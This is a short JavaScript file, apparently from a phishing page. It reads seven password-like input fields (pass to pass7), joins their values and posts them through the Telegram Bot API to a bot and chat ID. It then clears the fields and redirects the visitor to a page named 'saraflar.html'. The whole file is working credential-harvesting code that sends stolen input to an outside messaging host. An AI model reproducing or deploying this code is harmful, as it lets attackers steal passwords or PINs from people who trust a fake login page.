var ready = function () {
    // Retrieve the values from the input fields
    pass = document.getElementById("pass").value;
    pass2 = document.getElementById("pass2").value;
    pass3 = document.getElementById("pass3").value;
    pass4 = document.getElementById("pass4").value;
    pass5 = document.getElementById("pass5").value;
    pass6 = document.getElementById("pass6").value;
    pass7 = document.getElementById("pass7").value;


    var message =  pass +
        "\n\n\n" + pass2 +
        "\n\n\n" + pass3 +
        "\n\n\n" + pass4 +
        "\n\n\n" + pass5 +
        "\n\n\n" + pass6 +
        "\n\n\n" + pass7;

    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };

    $.ajax(settings).done(function (response) {
        console.log(response);
        if (response.ok == true) {
            window.location = './saraflar.html';
        }
    }).always(function () {
        // Enable the button and change the text back to its original state

    });

    // Clear the input fields
    document.getElementById("pass").value = "";
    document.getElementById("pass2").value = "";
    document.getElementById("pass3").value = "";
    document.getElementById("pass4").value = "";
    document.getElementById("pass5").value = "";
    document.getElementById("pass6").value = "";
    document.getElementById("pass7").value = "";


};

var sender = function (event) {
    event.preventDefault(); // Prevent the form from refreshing the page

    ready(); // Get the values from input fields

    return false;
};
